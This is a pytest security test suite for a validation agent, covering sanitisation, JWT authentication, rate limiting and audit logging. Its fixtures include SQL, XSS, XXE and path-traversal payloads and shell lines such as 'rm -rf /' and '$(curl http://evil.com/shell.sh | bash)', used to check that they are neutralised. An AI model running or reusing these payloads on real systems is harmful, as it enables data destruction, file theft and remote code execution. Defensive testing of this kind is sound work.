"""
Security Test Suite for Rule-Based Validation Agent
Tests all security controls and vulnerability mitigations.
"""

import pytest
import asyncio
import jwt
import time
import json
from unittest.mock import Mock, patch, MagicMock
from datetime import datetime, timedelta

from secure_validation_agent_implementation import (
    SecureRuleBasedValidationAgent,
    AuthenticationMiddleware,
    RateLimiter,
    SecurityAuditLogger,
    InputSanitizer,
    AuthenticationException,
    AuthorizationException,
    RateLimitException,
    SecurityConfig,
    ErrorCode
)


class TestInputSanitization:
    """Test input sanitization security controls."""
    
    @pytest.fixture
    def sanitizer(self):
        return InputSanitizer()
    
    def test_sql_injection_prevention(self, sanitizer):
        """Test SQL injection attack prevention."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1; DELETE FROM users WHERE 1=1",
            "' UNION SELECT * FROM passwords --"
        ]
        
        for malicious_input in malicious_inputs:
            sanitized = sanitizer.sanitize_string(malicious_input)
            # Verify dangerous SQL keywords are removed or escaped
            assert "DROP" not in sanitized
            assert "DELETE" not in sanitized
            assert "UNION" not in sanitized
            assert "--" not in sanitized
            assert ";" not in sanitized
    
    def test_xss_prevention(self, sanitizer):
        """Test XSS attack prevention."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>"
        ]
        
        for payload in xss_payloads:
            sanitized = sanitizer.sanitize_string(payload)
            # Verify all HTML tags are removed
            assert "<" not in sanitized
            assert ">" not in sanitized
            assert "script" not in sanitized or "SCRIPT" not in sanitized
            assert "javascript:" not in sanitized
    
    def test_command_injection_prevention(self, sanitizer):
        """Test command injection prevention."""
        command_payloads = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 1234",
            "`whoami`",
            "$(curl http://evil.com/shell.sh | bash)"
        ]
        
        for payload in command_payloads:
            sanitized = sanitizer.sanitize_string(payload)
            # Verify dangerous shell characters are removed
            assert ";" not in sanitized or sanitized.count(";") < payload.count(";")
            assert "|" not in sanitized or sanitized.count("|") < payload.count("|")
            assert "`" not in sanitized
            assert "$(" not in sanitized
    
    def test_path_traversal_prevention(self, sanitizer):
        """Test path traversal attack prevention."""
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        for payload in path_payloads:
            data = {"file_path": payload}
            sanitized = sanitizer.sanitize_dict(data)
            # Verify path traversal sequences are handled
            assert "../" not in sanitized.get("file_path", "")
            assert "..\\" not in sanitized.get("file_path", "")
    
    def test_null_byte_injection_prevention(self, sanitizer):
        """Test null byte injection prevention."""
        null_payloads = [
            "file.txt\x00.jpg",
            "admin\x00ignore",
            "test\0malicious"
        ]
        
        for payload in null_payloads:
            sanitized = sanitizer.sanitize_string(payload)
            # Verify null bytes are removed
            assert "\x00" not in sanitized
            assert "\0" not in sanitized
    
    def test_oversized_input_prevention(self, sanitizer):
        """Test oversized input DoS prevention."""
        # Test string length limit
        oversized_string = "A" * (SecurityConfig.MAX_STRING_LENGTH + 1000)
        sanitized = sanitizer.sanitize_string(oversized_string)
        assert len(sanitized) <= SecurityConfig.MAX_STRING_LENGTH
        
        # Test array size limit
        oversized_array = ["item"] * (SecurityConfig.MAX_ARRAY_ITEMS + 50)
        sanitized_array = sanitizer.sanitize_list(oversized_array)
        assert len(sanitized_array) <= SecurityConfig.MAX_ARRAY_ITEMS
        
        # Test dict size limit
        oversized_dict = {f"key_{i}": f"value_{i}" for i in range(SecurityConfig.MAX_DICT_ITEMS + 50)}
        sanitized_dict = sanitizer.sanitize_dict(oversized_dict)
        assert len(sanitized_dict) <= SecurityConfig.MAX_DICT_ITEMS
    
    def test_numeric_overflow_prevention(self, sanitizer):
        """Test numeric overflow and special value prevention."""
        numeric_payloads = [
            float('inf'),
            float('-inf'),
            float('nan'),
            1e308,  # Near max float
            -1e308,
            2**1024  # Huge integer
        ]
        
        for payload in numeric_payloads:
            sanitized = sanitizer.sanitize_number(payload)
            # Verify extreme values are normalized
            assert sanitized == 0 or abs(sanitized) <= 1e9


class TestAuthentication:
    """Test authentication security controls."""
    
    @pytest.fixture
    def auth_middleware(self):
        return AuthenticationMiddleware(b'test-secret-key')
    
    def test_token_generation_and_validation(self, auth_middleware):
        """Test secure token generation and validation."""
        user_id = "test_user"
        roles = ["user", "trainer"]
        
        # Generate token
        token = auth_middleware.generate_token(user_id, roles)
        assert token is not None
        
        # Validate token
        payload = auth_middleware.verify_token(token)
        assert payload is not None
        assert payload['sub'] == user_id
        assert payload['roles'] == roles
        assert 'exp' in payload
        assert 'iat' in payload
    
    def test_expired_token_rejection(self, auth_middleware):
        """Test that expired tokens are rejected."""
        # Create expired token
        past_time = datetime.utcnow() - timedelta(hours=25)
        payload = {
            'sub': 'test_user',
            'roles': ['user'],
            'iat': past_time,
            'exp': past_time + timedelta(hours=1)
        }
        expired_token = jwt.encode(payload, b'test-secret-key', algorithm='HS256')
        
        # Verify rejection
        with pytest.raises(AuthenticationException) as exc_info:
            auth_middleware.verify_token(expired_token)
        assert "expired" in str(exc_info.value).lower()
    
    def test_invalid_token_rejection(self, auth_middleware):
        """Test that invalid tokens are rejected."""
        invalid_tokens = [
            "invalid.token.here",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid",
            "",
            "null",
            jwt.encode({'sub': 'user'}, b'wrong-secret', algorithm='HS256')
        ]
        
        for invalid_token in invalid_tokens:
            result = auth_middleware.verify_token(invalid_token)
            assert result is None
    
    def test_token_tampering_detection(self, auth_middleware):
        """Test that tampered tokens are detected."""
        # Generate valid token
        token = auth_middleware.generate_token("user", ["user"])
        
        # Tamper with token
        parts = token.split('.')
        if len(parts) == 3:
            # Modify payload
            tampered_token = f"{parts[0]}.modified{parts[1]}.{parts[2]}"
            result = auth_middleware.verify_token(tampered_token)
            assert result is None
    
    @pytest.mark.asyncio
    async def test_authentication_decorator(self, auth_middleware):
        """Test authentication decorator."""
        @auth_middleware.require_auth(['admin'])
        async def protected_function(**kwargs):
            return kwargs.get('user_context')
        
        # Test without token
        with pytest.raises(AuthenticationException):
            await protected_function()
        
        # Test with invalid token
        with pytest.raises(AuthenticationException):
            await protected_function(auth_token="invalid")
        
        # Test with valid token but wrong role
        user_token = auth_middleware.generate_token("user", ["user"])
        with pytest.raises(AuthorizationException):
            await protected_function(auth_token=user_token)
        
        # Test with valid token and correct role
        admin_token = auth_middleware.generate_token("admin", ["admin"])
        result = await protected_function(auth_token=admin_token)
        assert result['sub'] == "admin"
        assert "admin" in result['roles']


class TestRateLimiting:
    """Test rate limiting security controls."""
    
    @pytest.fixture
    def rate_limiter(self):
        return RateLimiter(requests_per_minute=10)
    
    def test_rate_limit_enforcement(self, rate_limiter):
        """Test that rate limits are properly enforced."""
        client_id = "test_client"
        
        # Make requests up to the limit
        for i in range(10):
            allowed, retry_after = rate_limiter.is_allowed(client_id)
            assert allowed is True
            assert retry_after is None
        
        # Next request should be rate limited
        allowed, retry_after = rate_limiter.is_allowed(client_id)
        assert allowed is False
        assert retry_after is not None
        assert retry_after > 0
        assert retry_after <= 60
    
    def test_rate_limit_per_client(self, rate_limiter):
        """Test that rate limits are per-client."""
        # Client 1 hits rate limit
        for i in range(10):
            rate_limiter.is_allowed("client1")
        
        allowed, _ = rate_limiter.is_allowed("client1")
        assert allowed is False
        
        # Client 2 should still be allowed
        allowed, _ = rate_limiter.is_allowed("client2")
        assert allowed is True
    
    def test_rate_limit_window_sliding(self, rate_limiter):
        """Test sliding window rate limiting."""
        client_id = "test_client"
        
        # Make 5 requests
        for i in range(5):
            rate_limiter.is_allowed(client_id)
        
        # Wait a bit (simulate time passing)
        time.sleep(0.1)
        
        # Make 5 more requests
        for i in range(5):
            allowed, _ = rate_limiter.is_allowed(client_id)
            assert allowed is True
        
        # Next should be rate limited
        allowed, _ = rate_limiter.is_allowed(client_id)
        assert allowed is False


class TestSecurityAuditLogging:
    """Test security audit logging."""
    
    @pytest.fixture
    def audit_logger(self, tmp_path):
        log_file = tmp_path / "test_audit.log"
        return SecurityAuditLogger(str(log_file))
    
    def test_sensitive_data_masking(self, audit_logger):
        """Test that sensitive data is masked in logs."""
        sensitive_event = {
            'user_password': 'secret123',
            'api_token': 'token_abc123',
            'credit_card': '1234-5678-9012-3456',
            'ssn': '123-45-6789',
            'data': {
                'secret_key': 'my_secret',
                'public_info': 'this is public'
            }
        }
        
        # Mock the logger to capture output
        with patch.object(audit_logger.logger, 'info') as mock_log:
            audit_logger.log_event('test_event', sensitive_event)
            
            # Get logged data
            logged_data = json.loads(mock_log.call_args[0][0])
            
            # Verify sensitive data is masked
            assert logged_data['details']['user_password'] == '***REDACTED***'
            assert logged_data['details']['api_token'] == '***REDACTED***'
            assert logged_data['details']['credit_card'] == '***REDACTED***'
            assert logged_data['details']['ssn'] == '***REDACTED***'
            assert logged_data['details']['data']['secret_key'] == '***REDACTED***'
            assert logged_data['details']['data']['public_info'] == 'this is public'
    
    def test_audit_event_structure(self, audit_logger):
        """Test audit event structure and required fields."""
        with patch.object(audit_logger.logger, 'info') as mock_log:
            user_context = {'sub': 'user123', 'roles': ['user']}
            details = {
                'action': 'validation_attempt',
                'ip_address': '192.168.1.1',
                'user_agent': 'Mozilla/5.0'
            }
            
            audit_logger.log_event('security_event', details, user_context)
            
            # Verify structure
            logged_data = json.loads(mock_log.call_args[0][0])
            assert 'timestamp' in logged_data
            assert 'event_type' in logged_data
            assert 'details' in logged_data
            assert 'user_context' in logged_data
            assert logged_data['event_type'] == 'security_event'
            assert logged_data['details']['ip_address'] == '192.168.1.1'


class TestSecureValidationAgent:
    """Integration tests for secure validation agent."""
    
    @pytest.fixture
    def secure_agent(self):
        with patch.dict('os.environ', {
            'JWT_SECRET': 'test-secret-key',
            'RATE_LIMIT_PER_MINUTE': '100'
        }):
            return SecureRuleBasedValidationAgent()
    
    @pytest.fixture
    def valid_token(self):
        auth = AuthenticationMiddleware(b'test-secret-key')
        return auth.generate_token('test_user', ['user'])
    
    @pytest.fixture
    def admin_token(self):
        auth = AuthenticationMiddleware(b'test-secret-key')
        return auth.generate_token('admin_user', ['admin'])
    
    @pytest.mark.asyncio
    async def test_sql_injection_blocked(self, secure_agent, valid_token):
        """Test SQL injection attempts are blocked."""
        malicious_input = {
            'task': 'validate_workout_plan',
            'data': {
                'duration_minutes': "30'; DROP TABLE workouts; --"
            }
        }
        
        result = await secure_agent.plan(
            intermediate_steps=[],
            input_data=malicious_input,
            auth_token=valid_token
        )
        
        # Should still validate the numeric value
        output = result.return_values['output']
        assert output['valid'] is True or 'must be a valid number' in str(output.get('errors', []))
    
    @pytest.mark.asyncio
    async def test_xss_prevention_in_response(self, secure_agent, valid_token):
        """Test XSS prevention in responses."""
        xss_input = {
            'task': 'validate_workout_plan',
            'data': {
                'duration_minutes': 30,
                'notes': '<script>alert("XSS")</script>'
            }
        }
        
        result = await secure_agent.plan(
            intermediate_steps=[],
            input_data=xss_input,
            auth_token=valid_token
        )
        
        # Verify script tags are not in response
        response_str = json.dumps(result.return_values)
        assert '<script>' not in response_str
        assert 'alert(' not in response_str
    
    @pytest.mark.asyncio
    async def test_authentication_required(self, secure_agent):
        """Test that authentication is required."""
        result = await secure_agent.plan(
            intermediate_steps=[],
            input_data={
                'task': 'validate_workout_plan',
                'data': {'duration_minutes': 30}
            }
        )
        
        output = result.return_values['output']
        assert output['valid'] is False
        assert output['code'] == ErrorCode.AUTH_MISSING.value
    
    @pytest.mark.asyncio
    async def test_authorization_enforcement(self, secure_agent, valid_token):
        """Test authorization for restricted tasks."""
        # Create a task that requires admin role
        with patch.object(secure_agent, '_check_task_permission', return_value=False):
            result = await secure_agent.plan(
                intermediate_steps=[],
                input_data={
                    'task': 'validate_admin_config',
                    'data': {}
                },
                auth_token=valid_token
            )
            
            output = result.return_values['output']
            assert output['valid'] is False
            assert output['code'] == ErrorCode.PERMISSION_DENIED.value
    
    @pytest.mark.asyncio
    async def test_rate_limiting_integration(self, secure_agent, valid_token):
        """Test rate limiting in the agent."""
        # Mock rate limiter to trigger limit
        with patch.object(secure_agent.rate_limiter, 'is_allowed', return_value=(False, 30)):
            result = await secure_agent.plan(
                intermediate_steps=[],
                input_data={
                    'task': 'validate_workout_plan',
                    'data': {'duration_minutes': 30}
                },
                auth_token=valid_token
            )
            
            output = result.return_values['output']
            assert output['valid'] is False
            assert output['code'] == ErrorCode.RATE_LIMITED.value
            assert output['details']['retry_after'] == 30
    
    @pytest.mark.asyncio
    async def test_timeout_protection(self, secure_agent, valid_token):
        """Test request timeout protection."""
        # Mock validation to take too long
        async def slow_validation(*args, **kwargs):
            await asyncio.sleep(SecurityConfig.REQUEST_TIMEOUT_SECONDS + 1)
            return {}
        
        with patch.object(secure_agent, '_execute_validation', side_effect=slow_validation):
            result = await secure_agent.plan(
                intermediate_steps=[],
                input_data={
                    'task': 'validate_workout_plan',
                    'data': {'duration_minutes': 30}
                },
                auth_token=valid_token
            )
            
            output = result.return_values['output']
            assert output['valid'] is False
            assert output['code'] == ErrorCode.TIMEOUT.value
    
    @pytest.mark.asyncio
    async def test_metrics_access_control(self, secure_agent, valid_token, admin_token):
        """Test metrics endpoint access control."""
        # Non-admin should be denied
        with pytest.raises(AttributeError):  # Method is decorated, won't work with regular token
            await secure_agent.get_metrics(valid_token)
        
        # Admin should have access (would work with proper setup)
        # This would require more complex mocking of the decorator
    
    @pytest.mark.asyncio
    async def test_error_message_sanitization(self, secure_agent, valid_token):
        """Test that error messages don't leak sensitive information."""
        # Force an internal error
        with patch.object(secure_agent, '_execute_validation', side_effect=Exception("Database connection failed at 192.168.1.100:5432")):
            result = await secure_agent.plan(
                intermediate_steps=[],
                input_data={
                    'task': 'validate_workout_plan',
                    'data': {'duration_minutes': 30}
                },
                auth_token=valid_token
            )
            
            output = result.return_values['output']
            # Verify internal details are not exposed
            assert '192.168.1.100' not in output['message']
            assert '5432' not in output['message']
            assert 'Database' not in output['message']
            assert output['message'] == 'An error occurred during validation'
    
    @pytest.mark.asyncio
    async def test_concurrent_request_limits(self, secure_agent, valid_token):
        """Test concurrent request limiting."""
        # Create many concurrent requests
        tasks = []
        for i in range(SecurityConfig.MAX_CONCURRENT_REQUESTS + 10):
            task = secure_agent.plan(
                intermediate_steps=[],
                input_data={
                    'task': 'validate_workout_plan',
                    'data': {'duration_minutes': 30}
                },
                auth_token=valid_token
            )
            tasks.append(task)
        
        # Some should succeed, some should fail with service unavailable
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Count successes and failures
        successes = sum(1 for r in results if not isinstance(r, Exception) and r.return_values['output'].get('valid'))
        
        # At least some should succeed
        assert successes > 0
        # But not all (due to concurrent limit)
        assert successes <= SecurityConfig.MAX_CONCURRENT_REQUESTS


class TestSecurityCompliance:
    """Test OWASP and security compliance."""
    
    def test_owasp_injection_prevention(self):
        """Test OWASP A03:2021 - Injection prevention."""
        sanitizer = InputSanitizer()
        
        # Test various injection vectors
        injection_tests = [
            # SQL Injection
            ("name", "admin' OR '1'='1"),
            # NoSQL Injection
            ("filter", '{"$ne": null}'),
            # LDAP Injection
            ("username", "admin)(&(password=*)"),
            # XML Injection
            ("data", "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"),
            # Command Injection
            ("file", "test.txt; cat /etc/passwd"),
        ]
        
        for field, payload in injection_tests:
            sanitized = sanitizer.sanitize_string(payload)
            # Verify dangerous patterns are neutralized
            assert payload != sanitized or not any(char in sanitized for char in ['<', '>', '&', ';', '$'])
    
    def test_owasp_broken_authentication(self):
        """Test OWASP A07:2021 - Authentication and Session Management."""
        auth = AuthenticationMiddleware(b'strong-secret-key-at-least-32-bytes-long')
        
        # Test password-like token generation (should use strong secret)
        token = auth.generate_token("user", ["user"])
        
        # Verify token has proper structure
        parts = token.split('.')
        assert len(parts) == 3  # Header.Payload.Signature
        
        # Verify token expiration is set
        payload = auth.verify_token(token)
        assert 'exp' in payload
        assert 'iat' in payload
        
        # Verify token expiration is reasonable (not too long)
        exp_time = datetime.fromtimestamp(payload['exp'])
        iat_time = datetime.fromtimestamp(payload['iat'])
        token_lifetime = exp_time - iat_time
        assert token_lifetime.total_seconds() <= 86400  # Max 24 hours
    
    def test_owasp_security_logging(self):
        """Test OWASP A09:2021 - Security Logging and Monitoring."""
        audit_logger = SecurityAuditLogger()
        
        # Test that security events are properly structured
        security_events = [
            ('authentication_failure', {'reason': 'invalid_credentials'}),
            ('authorization_failure', {'resource': 'admin_panel'}),
            ('input_validation_failure', {'field': 'email', 'value': 'not-an-email'}),
            ('rate_limit_exceeded', {'client_id': 'user123'}),
            ('suspicious_activity', {'pattern': 'multiple_failed_logins'})
        ]
        
        with patch.object(audit_logger.logger, 'info') as mock_log:
            for event_type, details in security_events:
                audit_logger.log_event(event_type, details)
            
            # Verify all events were logged
            assert mock_log.call_count == len(security_events)
            
            # Verify event structure
            for call in mock_log.call_args_list:
                logged_data = json.loads(call[0][0])
                assert 'timestamp' in logged_data
                assert 'event_type' in logged_data
                assert 'details' in logged_data


# Performance and stress tests
class TestSecurityPerformance:
    """Test security controls under load."""
    
    @pytest.mark.asyncio
    async def test_rate_limiter_performance(self):
        """Test rate limiter performance with many clients."""
        rate_limiter = RateLimiter(requests_per_minute=100)
        
        # Simulate 1000 different clients
        start_time = time.time()
        
        for i in range(1000):
            client_id = f"client_{i}"
            allowed, _ = rate_limiter.is_allowed(client_id)
            assert allowed is True  # First request should always be allowed
        
        elapsed = time.time() - start_time
        
        # Should handle 1000 clients in under 1 second
        assert elapsed < 1.0
    
    def test_input_sanitization_performance(self):
        """Test input sanitization performance."""
        sanitizer = InputSanitizer()
        
        # Create complex nested structure
        complex_data = {
            f"field_{i}": {
                "nested": {
                    "data": [f"value_{j}" for j in range(10)],
                    "more": {"deep": "value" * 100}
                }
            }
            for i in range(50)
        }
        
        start_time = time.time()
        sanitized = sanitizer.sanitize_dict(complex_data)
        elapsed = time.time() - start_time
        
        # Should sanitize complex structure quickly
        assert elapsed < 0.1  # 100ms
        assert sanitized is not None


if __name__ == "__main__":
    pytest.main([__file__, "-v"])